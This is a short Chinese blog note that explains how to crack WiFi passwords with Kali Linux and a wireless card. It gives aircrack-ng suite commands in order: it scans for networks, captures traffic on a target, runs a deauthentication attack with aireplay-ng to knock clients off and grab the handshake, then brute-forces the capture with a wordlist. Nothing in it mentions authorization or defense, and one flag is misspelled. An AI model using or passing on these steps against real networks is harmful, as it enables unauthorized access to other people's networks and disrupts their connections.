---
title: kali无线网卡破解wifi密码.md
toc: true
date: 2021-09-23 20:50:54
tags:
categories:黑
---



*先决条件：`kali+网卡`*

`airmon-ng check kill`清缓存

`iwconfig`及`ifconfig`找网卡名称（以下命名为wlan0）

`airodump-ng wlan0`查看列表

`airodump-ng wlan0 —bassid mac地址 -c 1 -w 文件名(如:haha)`监听，此窗口不要关闭

当发现有设备在连接后`aireplay-ng -0 20 -a mac地址 -c 设备地址 wlan0`断网攻击，以抓取数据包.cap

暴力破解数据包`aircrack-ng -w 字典 包`
